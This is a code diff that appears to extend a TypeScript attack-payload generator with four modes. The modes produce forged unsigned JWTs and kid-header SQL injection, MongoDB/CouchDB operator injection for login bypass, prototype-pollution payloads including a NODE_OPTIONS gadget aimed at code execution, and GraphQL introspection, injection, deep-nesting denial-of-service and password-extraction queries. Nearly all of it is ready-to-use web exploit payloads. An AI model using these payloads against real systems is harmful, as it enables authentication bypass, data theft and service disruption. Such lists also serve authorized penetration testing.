@@ -685,3 +685,72 @@ export function generateSuggestions(
       ];
   }
 }
+
+export const EXTRA_MODES: PayloadMode[] = [
+  {
+    id:"jwt_attack", label:"JWT Attack", description:"JWT none/alg-confusion/kid injection payloads",
+    generate(_target: string, _opts: PayloadOpts): string[] {
+      const header = Buffer.from('{"alg":"none","typ":"JWT"}').toString('base64url');
+      const claim  = Buffer.from(`{"sub":"admin","role":"admin","iat":${Math.floor(Date.now()/1000)}}`).toString('base64url');
+      return [
+        `${header}.${claim}.`,
+        `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.`,
+        `{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'nx_secret' --"}`,
+        `{"alg":"HS256","typ":"JWT","kid":"../../../../../../dev/null"}`,
+        `{"alg":"none","typ":"JWT"}`,
+      ];
+    }
+  },
+  {
+    id:"nosql_injection", label:"NoSQL Injection", description:"MongoDB/CouchDB operator injection payloads",
+    generate(_target: string, _opts: PayloadOpts): string[] {
+      return [
+        `{"username":{"$gt":""},"password":{"$gt":""}}`,
+        `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`,
+        `{"username":{"$regex":"^admin"},"password":{"$gt":""}}`,
+        `{"username":{"$where":"function(){return true}"},"password":"x"}`,
+        `{"$where":"this.password.match(/.*/)"}`,
+        `username[$gt]=&password[$gt]=`,
+        `username[$ne]=invalid&password[$ne]=invalid`,
+        `username[$regex]=^admin&password[$gt]=`,
+        `{"selector":{"_id":{"$gt":null}}}`,
+      ];
+    }
+  },
+  {
+    id:"prototype_pollution", label:"Prototype Pollution", description:"JavaScript __proto__/constructor.prototype pollution",
+    generate(_target: string, _opts: PayloadOpts): string[] {
+      return [
+        `{"__proto__":{"isAdmin":true}}`,
+        `{"__proto__":{"role":"admin","authorized":true}}`,
+        `{"constructor":{"prototype":{"isAdmin":true}}}`,
+        `?__proto__[isAdmin]=true`,
+        `?__proto__.role=admin`,
+        `?constructor.prototype.isAdmin=true`,
+        `{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /dev/stdin"}}`,
+        `%5B__proto__%5D%5BisAdmin%5D=true`,
+        `{"a":1,"__proto__":{"polluted":true,"isAdmin":1}}`,
+      ];
+    }
+  },
+  {
+    id:"graphql_injection", label:"GraphQL Injection", description:"GraphQL introspection, DoS, injection, IDOR",
+    generate(_target: string, _opts: PayloadOpts): string[] {
+      return [
+        `{"query":"{__schema{queryType{name}types{name,kind,fields{name}}}}"}`,
+        `{"query":"{__typename}"}`,
+        `{"query":"{user(id:\\"1 OR 1=1\\"){id,username,email}}"}`,
+        `{"query":"mutation{login(username:\\"admin\\" password:\\"' OR '1'='1\\"){token}}"}`,
+        `[{"query":"{user(id:1){username}}"},{"query":"{user(id:2){username}}"}]`,
+        `{"query":"{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{a{__typename}}}}}}}}}}}}}}}}"}`,
+        `{"query":"{${Array(100).fill("nx:__typename").join(",")}}"}`,
+        `{"query":"{users{id,username,email,password,isAdmin}}"}`,
+        `{"query":"query{...F}fragment F on Query{users{password,secretToken}}"}`,
+      ];
+    }
+  },
+];
+
+export function getAllModes(): PayloadMode[] {
+  return [...BASE_MODES, ...EXTRA_MODES];
+}
